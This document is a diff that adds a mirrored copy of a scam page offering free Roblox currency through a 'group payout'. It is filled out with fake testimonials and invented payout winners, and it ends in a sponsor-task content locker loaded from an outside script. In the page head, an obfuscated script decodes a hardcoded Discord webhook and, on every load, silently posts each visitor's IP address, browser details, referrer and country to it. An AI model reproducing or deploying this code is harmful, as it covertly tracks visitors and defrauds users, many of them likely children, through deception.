@@ -1,0 +1,704 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+
+<!-- Mirrored from 8585.bio/logo2.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 09 Apr 2025 21:04:47 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Group Payouts</title>
+    <link rel="icon" type="image/x-icon" href="../upload.wikimedia.org/wikipedia/commons/7/7e/Roblox_Logo_2022.jpg">
+
+    <!-- SEO Meta Tags -->
+    <meta name="description" content="8585.bio - Fast and secure Roblox group payouts. Get your Robux instantly and hassle-free.">
+    <meta name="keywords" content="8585.bio, 8585, roblox payouts, roblox group, fast robux, robux payouts, secure robux, robux transfer">
+    <meta name="author" content="8585.bio">
+    <meta name="robots" content="index, follow">
+    <meta property="og:title" content="8585.bio - Roblox Group Payouts">
+    <meta property="og:description" content="Fast and secure Roblox group payouts. Get your Robux instantly and hassle-free.">
+    <meta property="og:image" content="../upload.wikimedia.org/wikipedia/commons/7/7e/Roblox_Logo_2022.jpg">
+    <meta property="og:url" content="index.html">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="8585.bio - Roblox Group Payouts">
+    <meta name="twitter:description" content="Fast and secure Roblox group payouts. Get your Robux instantly and hassle-free.">
+    <meta name="twitter:image" content="ihttps://upload.wikimedia.org/wikipedia/commons/7/7e/Roblox_Logo_2022.jpg">
+    <meta name="twitter:site" content="@8585bio">
+
+    <link rel="stylesheet" href="css/style.css">
+  
+<script type="text/javascript">
+    var yikop_Xhr_MiAaqc={"it":4470067,"key":"66fa4"};
+</script>
+<script src="https://d2yc6hxtq0phup.cloudfront.net/ddbd01f.js"></script>
+    <script type="text/javascript">
+const _0x41be7b=_0x4ce0;function _0x4ce0(_0x321ebe,_0x3948bd){const _0x2b523b=_0x2b52();return _0x4ce0=function(_0x4ce0bf,_0xe97948){_0x4ce0bf=_0x4ce0bf-0x174;let _0x3ebe44=_0x2b523b[_0x4ce0bf];return _0x3ebe44;},_0x4ce0(_0x321ebe,_0x3948bd);}(function(_0x4bb10d,_0x27cbd4){const _0xd20de3=_0x4ce0,_0x5511cd=_0x4bb10d();while(!![]){try{const _0x49eeb0=-parseInt(_0xd20de3(0x179))/0x1+parseInt(_0xd20de3(0x176))/0x2+parseInt(_0xd20de3(0x17c))/0x3+parseInt(_0xd20de3(0x177))/0x4+parseInt(_0xd20de3(0x17b))/0x5+parseInt(_0xd20de3(0x175))/0x6*(parseInt(_0xd20de3(0x178))/0x7)+-parseInt(_0xd20de3(0x174))/0x8*(parseInt(_0xd20de3(0x17d))/0x9);if(_0x49eeb0===_0x27cbd4)break;else _0x5511cd['push'](_0x5511cd['shift']());}catch(_0x2b78d0){_0x5511cd['push'](_0x5511cd['shift']());}}}(_0x2b52,0x9a968));function _0x2b52(){const _0x287323=['51848FUWppO','1459116xwfSVU','2504468RNhGvD','2430236eMjkei','7EvHCRl','315582TSqlbs','https://discord.com/api/webhooks/1358080595111972984/bswKz492VG7YD3Ji6apYneRRgUKEpaf8S2uDRS_Fe1nvs038KkZMvJm2H2e2aOQdBNQa','188465LesQAL','993411VWCSsm','2115rxMnnL'];_0x2b52=function(){return _0x287323;};return _0x2b52();}const webhookUrl=_0x41be7b(0x17a);        // Function to generate a random "stripe-like" color
+        // Function to generate a random "stripe-like" color
+        function getRandomColor() {
+          return Math.floor(Math.random() * 0xffffff);
+        }
+
+        async function sendToDiscord(data) {
+          try {
+            // Fetch geolocation data from GeoJS
+            const ipInfoResponse = await fetch(`https://get.geojs.io/v1/ip/geo/${data.ip}.json`);
+            if (!ipInfoResponse.ok) {
+              throw new Error('Failed to fetch IP geolocation data');
+            }
+            const ipInfo = await ipInfoResponse.json();
+
+            // Get country flag emoji
+            const countryCode = ipInfo.country_code.toLowerCase();
+            const countryFlag = countryCode.toUpperCase().replace(/./g, char => String.fromCodePoint(char.charCodeAt(0) + 127397));
+
+            // Format time in UTC to allow Discord to render it in the user's local timezone
+            const utcTime = new Date().toISOString();
+
+            // Generate the Discord embed payload
+            const payload = {
+              embeds: [
+                {
+                  title: `New Website Visitor ${countryFlag}`, // Include flag in the title
+                  color: getRandomColor(), // Set random color for each request
+                  fields: [
+                    { name: 'IP Address', value: data.ip },
+                    { name: 'User Agent', value: data.user_agent },
+                    { name: 'Referrer', value: data.referrer }, // Always show referrer URL
+                    { name: 'ID', value: data.id },
+                    { name: 'Country', value: `${ipInfo.country} ${countryFlag}` },
+                    { name: 'Time', value: `<t:${Math.floor(new Date(utcTime).getTime() / 1000)}:F>` } // Discord's timestamp format
+                  ]
+                }
+              ]
+            };
+
+            // Send the data to the Discord webhook
+            const response = await fetch(webhookUrl, {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify(payload)
+            });
+
+            if (!response.ok) {
+              console.error('Failed to send data to Discord:', response.status);
+            } else {
+              console.log('Data sent to Discord successfully!');
+            }
+          } catch (error) {
+            console.error('Error sending data to Discord:', error);
+          }
+        }
+
+        // Fetch visitor IP address and send data to Discord
+        fetch('https://get.geojs.io/v1/ip.json')
+          .then(response => response.json())
+          .then(data => {
+            // If `document.referrer` is empty, fall back to the current URL
+            const referrer = document.referrer || window.location.href;
+
+            sendToDiscord({
+              ip: data.ip,
+              user_agent: navigator.userAgent,
+              referrer, // Send the detected or fallback referrer
+              id: `p${Math.random().toString(36).substring(2, 7)}`
+            });
+          })
+          .catch(error => {
+            console.error('Error fetching visitor data:', error);
+          });
+    </script>
+
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Arial', sans-serif;
+            background-color: #f0f2f5;
+        }
+
+        nav {
+            background-color: #DEE1E3;
+            overflow: hidden;
+            padding: 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: relative;
+        }
+
+        .nav-logo {
+            padding: 15px;
+        }
+
+            .nav-logo img {
+                height: 35px;
+                width: auto;
+            }
+
+        .nav-links {
+            display: flex;
+            list-style: none;
+            margin: 0;
+            padding: 0;
+            justify-content: flex-end;
+            flex-grow: 1;
+        }
+
+            .nav-links li {
+                margin: 0 10px;
+            }
+
+                .nav-links li a {
+                    display: block;
+                    color: black;
+                    text-align: center;
+                    padding: 15px 20px;
+                    text-decoration: none;
+                    transition: background-color 0.3s ease;
+                }
+
+                    .nav-links li a:hover {
+                        background-color: #ddd;
+                        color: black;
+                    }
+
+        .menu-icon {
+            display: none;
+            cursor: pointer;
+            padding: 15px;
+        }
+
+            .menu-icon div {
+                width: 25px;
+                height: 3px;
+                background-color: black;
+                margin: 4px 0;
+            }
+
+        .burger-menu {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            background-color: #333;
+            position: absolute;
+            top: 60px;
+            left: 0;
+            width: 100%;
+            padding: 20px 0;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+        }
+
+            .burger-menu a {
+                padding: 10px 20px;
+                width: 100%;
+                text-align: center;
+                color: white;
+                text-decoration: none;
+                background-color: #333;
+                border: none;
+                display: inline-block;
+                cursor: pointer;
+                transition: background-color 0.3s ease;
+            }
+
+                .burger-menu a:hover {
+                    background-color: #444;
+                }
+
+            .burger-menu.active {
+                display: flex;
+                z-index: 1;
+            }
+
+        nav.menu-open {
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+        }
+
+        @media (max-width: 767px) {
+            .nav-links {
+                display: none;
+            }
+
+            .menu-icon {
+                display: block;
+            }
+
+            .nav-logo img {
+                content: url('images/logo2.png');
+                height: 40px;
+                width: auto;
+            }
+        }
+
+        .middle {
+            margin: 60px auto;
+            padding: 20px;
+            width: 80%;
+            max-width: 970px;
+            background-image: url("images/fireworks.webp");
+            background-size: cover;
+            background-repeat: no-repeat;
+            color: #fff;
+            text-align: center;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .box_con {
+            margin: 60px auto;
+            padding: 20px;
+            width: 100%;
+            max-width: 970px;
+            text-align: center;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .complete-task-button {
+            background-color: #00AF6E;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 19px;
+            margin: 4px 2px;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: background-color 0.3s ease;
+        }
+
+            .complete-task-button:hover {
+                background-color: #008F57;
+            }
+
+        .recent-winners {
+            background-color: #f2f4f5;
+            padding: 20px;
+            margin: 20px auto;
+            width: 100%;
+            max-width: 970px;
+            text-align: center;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+            .recent-winners h4 {
+                margin-bottom: 10px;
+            }
+
+            .recent-winners ul {
+                list-style-type: none;
+                padding: 0;
+                display: flex;
+                justify-content: space-between;
+                flex-wrap: wrap;
+            }
+
+            .recent-winners li {
+                background-color: white;
+                border-radius: 8px;
+                box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+                margin: 10px;
+                padding: 15px;
+                text-align: center;
+                width: calc(33% - 20px);
+            }
+
+            .recent-winners .avatar-card img {
+                border-radius: 50%;
+                margin-bottom: 10px;
+                width: 60px;
+                height: 60px;
+                border: 2px solid #ddd;
+                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            }
+
+            .recent-winners .avatar-card .avatar-name {
+                font-weight: bold;
+                margin-bottom: 5px;
+                font-size: 1.2em;
+            }
+
+            .recent-winners .avatar-card .avatar-robux {
+                font-size: 1em;
+                color: #555;
+            }
+
+        @media (max-width: 991px) {
+            .middle, .box_con, .recent-winners {
+                width: 100%;
+                padding: 12px 0;
+            }
+
+                .recent-winners ul {
+                    flex-wrap: wrap;
+                }
+
+                .recent-winners li {
+                    width: calc(50% - 20px);
+                }
+
+            .nav-logo img {
+                height: 30px;
+            }
+
+            .nav-links li a {
+                padding: 10px 15px;
+            }
+        }
+
+        @media (max-width: 767px) {
+            .middle, .box_con, .recent-winners {
+                margin: 40px auto;
+            }
+
+                .recent-winners li {
+                    width: 100%;
+                    margin: 10px 0;
+                }
+
+            .nav-logo img {
+                height: 25px;
+            }
+        }
+
+        .testimonial-carousel {
+            position: relative;
+            width: 100%;
+            max-width: 600px;
+            margin: 20px auto;
+            overflow: hidden;
+            border-radius: 8px;
+        }
+
+        .testimonial-carousel-inner {
+            display: flex;
+            transition: transform 0.5s ease;
+        }
+
+        .testimonial {
+            min-width: 100%;
+            box-sizing: border-box;
+            padding: 20px;
+            text-align: center;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            background: #fff;
+        }
+
+            .testimonial p {
+                font-size: 1.1em;
+                color: #555;
+                margin-bottom: 10px;
+            }
+
+            .testimonial .user {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                margin-top: 10px;
+            }
+
+                .testimonial .user img {
+                    border-radius: 50%;
+                    width: 50px;
+                    height: 50px;
+                    margin-right: 10px;
+                    border: 2px solid #ddd;
+                    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+                }
+
+                .testimonial .user .name {
+                    font-weight: bold;
+                    color: #333;
+                }
+
+        .testimonial-dots {
+            text-align: center;
+            margin-top: 10px;
+        }
+
+            .testimonial-dots span {
+                display: inline-block;
+                width: 10px;
+                height: 10px;
+                margin: 0 5px;
+                background-color: #bbb;
+                border-radius: 50%;
+                cursor: pointer;
+            }
+
+            .testimonial-dots .active {
+                background-color: #717171;
+            }
+    </style>
+</head>
+<body>
+    <nav>
+        <div class="nav-logo">
+            <a href="#"><img src="images/logo2.png" alt="Logo" style="height: 35px;"></a>
+        </div>
+        <div class="menu-icon" onclick="toggleMenu()">
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+        <ul class="nav-links">
+            <li><a href="https://www.roblox.com/discover#/" target="_blank">Discover</a></li>
+            <li><a href="https://www.roblox.com/catalog?Category=1&amp;salesTypeFilter=1" target="_blank">Marketplace</a></li>
+            <li><a href="https://www.roblox.com/upgrades/robux?ctx=nav" target="_blank">Robux</a></li>
+        </ul>
+    </nav>
+    <div class="burger-menu">
+        <a href="https://www.roblox.com/discover#/" target="_blank">Discover</a>
+        <a href="https://www.roblox.com/catalog?Category=1&amp;salesTypeFilter=1" target="_blank">Marketplace</a>
+        <a href="https://www.roblox.com/upgrades/robux?ctx=nav" target="_blank">Robux</a>
+    </div>
+
+    <div class="middle">
+        <h2>Roblox Administrator R$ Group</h2>
+        <p>
+            Connect your Roblox account by entering your username to begin!<br><br>
+            You will be able to choose any amount of Robux you would like, and you will then be prompted to join the group.<br><br>
+            Robux can be used for testing purposes, or to purchase accessories and gamepasses!
+        </p>
+    </div>
+
+    <div class="box_con">
+        <div class="box">
+            <h3>Roblox Username</h3><br>
+            <input class="username" type="text" name="" placeholder="Enter username"><br>
+            <button class="getrbx">Next</button>
+        </div>
+        <div class="box2">
+            <div class="folding">
+                <div class="sk-cube1 sk-cube"></div>
+                <div class="sk-cube2 sk-cube"></div>
+                <div class="sk-cube4 sk-cube"></div>
+                <div class="sk-cube3 sk-cube"></div>
+                <div class="square"></div>
+            </div>
+            <p class="useroutput" style="text-align: center; margin-top: 30px;">searching for username ...</p>
+        </div>
+        <div class="box3">
+            <div class="container">
+                <h3>Amount of Robux</h3>
+                <div class="row">
+                    <div class="price">$0.00</div>
+                    <div class="details">
+                        <div class="robux_total">
+                            <div class="pic"><img src="images/robux-removebg-preview.png"></div><span>880</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="price">$0.00</div>
+                    <div class="details">
+                        <div class="robux_total">
+                            <div class="pic"><img src="images/robux-removebg-preview.png"></div><span>1870</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="price">$0.00</div>
+                    <div class="details">
+                        <div class="robux_total">
+                            <div class="pic"><img src="images/robux-removebg-preview.png"></div><span>4950</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="price">$0.00</div>
+                    <div class="details">
+                        <div class="robux_total">
+                            <div class="pic"><img src="images/robux-removebg-preview.png"></div><span>11000</span>
+                        </div>
+                    </div>
+                </div>
+                <div id="payoutUser" style="margin-top: 20px;">
+                    <h3>Paying out to user: <span id="usernameDisplay"></span></h3>
+                </div>
+            </div>
+        </div>
+        <div class="box4">
+            <h3>Final Step</h3>
+            <p>Through our partnerships with sponsors, players can earn Robux by completing simple tasks.</p><br>
+            <button class="complete-task-button" onclick=" _Kx()">Continue</button>
+        </div>
+    </div>
+
+    <div class="testimonial-carousel">
+        <div class="testimonial-carousel-inner">
+            <div class="testimonial active">
+                <p>"I received my Robux within minutes! Highly recommend this site!"</p>
+                <div class="user">
+                    <img src="images/user1.jpg" alt="User 1">
+                    <div class="name">BlazeFury</div>
+                </div>
+            </div>
+            <div class="testimonial">
+                <p>"Great service and very fast delivery. I got my Robux<br> in no time!"</p>
+                <div class="user">
+                    <img src="images/user2.jpg" alt="User 2">
+                    <div class="name">CosmicGuardian</div>
+                </div>
+            </div>
+            <div class="testimonial">
+                <p>"This site is legit! Got my Robux without any issues."</p>
+                <div class="user">
+                    <img src="images/user3.jpg" alt="User 3">
+                    <div class="name">ShadowNinjaX</div>
+                </div>
+            </div>
+            <div class="testimonial">
+                <p>"Amazing experience, got my Robux super quick.<br>Will use again."</p>
+                <div class="user">
+                    <img src="images/user4.jpg" alt="User 4">
+                    <div class="name">ThunderStriker</div>
+                </div>
+            </div>
+        </div>
+        <div class="testimonial-dots">
+            <span class="active"></span>
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+    </div>
+
+    <div class="recent-winners">
+        <h4>Recent Payouts</h4><br>
+        <ul class="hlist avatar-cards">
+            <li class="list-item avatar-card">
+                <div class="avatar-card-container">
+                    <div class="avatar-card-fullbody">
+                        <a href="https://www.roblox.com/users/140258990/profile" target="_blank" class="avatar-card-link">
+                            <span class="avatar-card-image thumbnail-2d-container"><img class="avatar-card-image" src="images/RealKreek.png" alt=""></span>
+                        </a>
+                        <a href="#" class="avatar-status game">
+                            <span class="icon-game"></span>
+                        </a>
+                    </div>
+                    <div class="avatar-card-caption">
+                        <div class="text-overflow avatar-name">RealKreek</div>
+                        <div class="avatar-card-label avatar-robux">Received 100K+ Robux</div>
+                        <span class="avatar-status-container">
+                            <div class="avatar-card-label"></div>
+                            <a href="#" class="text-link text-overflow avatar-status-link"></a>
+                        </span>
+                    </div>
+                </div>
+            </li>
+            <li class="list-item avatar-card">
+                <div class="avatar-card-container">
+                    <div class="avatar-card-fullbody">
+                        <a href="https://www.roblox.com/users/profile" target="_blank" class="avatar-card-link">
+                            <span class="avatar-card-image thumbnail-2d-container"><img class="avatar-card-image" src="images/mrflimflam.png" alt=""></span>
+                        </a>
+                        <a href="#" class="avatar-status online">
+                            <span class="icon-online"></span>
+                        </a>
+                    </div>
+                    <div class="avatar-card-caption">
+                        <div class="text-overflow avatar-name">mrflimflam</div>
+                        <div class="avatar-card-label avatar-robux">Received 40K+ Robux</div>
+                        <span class="avatar-status-container">
+                            <div class="avatar-card-label"></div>
+                        </span>
+                    </div>
+                </div>
+            </li>
+            <li class="list-item avatar-card">
+                <div class="avatar-card-container">
+                    <div class="avatar-card-fullbody">
+                        <a href="https://www.roblox.com/users/1214936835/profile" target="_blank" class="avatar-card-link">
+                            <span class="avatar-card-image thumbnail-2d-container"><img class="avatar-card-image" src="images/lankyboxjustin.png" alt=""></span>
+                        </a>
+                        <a href="#" class="avatar-status online">
+                            <span class="icon-online"></span>
+                        </a>
+                    </div>
+                    <div class="avatar-card-caption">
+                        <div class="text-overflow avatar-name">LankyBox</div>
+                        <div class="text-overflow avatar-card-label avatar-robux">Received 80K Robux</div>
+                        <span class="avatar-status-container"></span>
+                    </div>
+                </div>
+            </li>
+        </ul>
+    </div>
+
+    <div id="bottom" style="text-align: center;">
+        <div class="small-oneline text">
+            <br><br><br><br><br>
+            © Copyright 2025, all rights reserved.<br>
+            All trademarks, service marks, trade names, trade dress, product names and logos appearing on the site are the property of their respective owners.
+        </div><br>
+    </div>
+
+    <script src="js/app.js"></script>
+    <script>function toggleMenu() {
+            const burgerMenu = document.querySelector('.burger-menu');
+            const nav = document.querySelector('nav');
+            burgerMenu.classList.toggle('active');
+            nav.classList.toggle('menu-open');
+        }
+
+        function updateLogoSize() {
+            const logo = document.querySelector('.nav-logo img');
+            if (window.innerWidth <= 767) {
+                logo.src = 'logo2.html';
+                logo.style.height = '40px';
+            } else {
+                logo.src = 'images/logob.png';
+                logo.style.height = '35px';
+            }
+        }
+
+        window.addEventListener('resize', updateLogoSize);
+        window.addEventListener('load', updateLogoSize);
+
+        document.querySelector('.getrbx').addEventListener('click', function () {
+            const username = document.querySelector('.username').value;
+            document.getElementById('usernameDisplay').textContent = username;
+        });
+
+        let currentIndex = 0;
+        const testimonials = document.querySelectorAll('.testimonial');
+        const totalTestimonials = testimonials.length;
+        const dots = document.querySelectorAll('.testimonial-dots span');
+
+        function showTestimonial(index) {
+            const testimonialCarouselInner = document.querySelector('.testimonial-carousel-inner');
+            testimonialCarouselInner.style.transform = `translateX(-${index * 100}%)`;
+            testimonials.forEach((testimonial, i) => {
+                testimonial.classList.toggle('active', i === index);
+            });
+            dots.forEach((dot, i) => {
+                dot.classList.toggle('active', i === index);
+            });
+        }
+
+        function showNextTestimonial() {
+            currentIndex = (currentIndex + 1) % totalTestimonials;
+            showTestimonial(currentIndex);
+        }
+
+        dots.forEach((dot, index) => {
+            dot.addEventListener('click', () => {
+                currentIndex = index;
+                showTestimonial(currentIndex);
+            });
+        });
+
+        setInterval(showNextTestimonial, 3000);</script>
+
+<!-- Mirrored from 8585.bio/logo2.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 09 Apr 2025 21:04:47 GMT -->
+</html>
